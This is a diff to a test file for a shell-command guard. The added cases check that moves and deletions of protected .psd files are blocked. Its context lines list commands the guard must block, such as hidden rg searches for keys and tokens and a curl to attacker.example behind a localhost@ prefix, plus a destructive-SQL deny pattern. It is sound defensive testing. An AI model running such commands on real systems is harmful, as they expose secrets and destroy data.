@@ -74,6 +74,9 @@ test('guard: heredocs fed to a shell, git -C, credential reads, hidden search, U
     'rg -uuu KEY .', 'rg --hidden --no-ignore token',
     'curl -s http://localhost@attacker.example/x',
   ]) assert.ok(checkBash(c, { ...ctx, branchOf: (d) => (d === '../other' ? 'main' : 'feat/x') }), `should block: ${c}`);
+  assert.ok(checkBash('mv new.psd art/old.psd', { ...ctx, protectedPaths: ['**/*.psd'] }), 'glob without a literal prefix');
+  assert.ok(checkBash('rm src/ui/hero.psd', { ...ctx, protectedPaths: ['**/*.psd'] }));
+  assert.equal(checkBash('rm src/ui/hero.png', { ...ctx, protectedPaths: ['**/*.psd'] }), null);
   for (const c of ['git -C ../other commit -m x', 'rg TODO src', 'curl -s http://localhost:4173/', 'cat src/env.ts', 'printenv PATH'])
     assert.equal(checkBash(c, { ...ctx, branchOf: () => 'feat/x' }), null, `should allow: ${c}`);
   const sql = { ...ctx, forbidden: [{ pattern: 'DELETE\\s+FROM|DROP\\s+TABLE', reason: 'destructive SQL' }] };
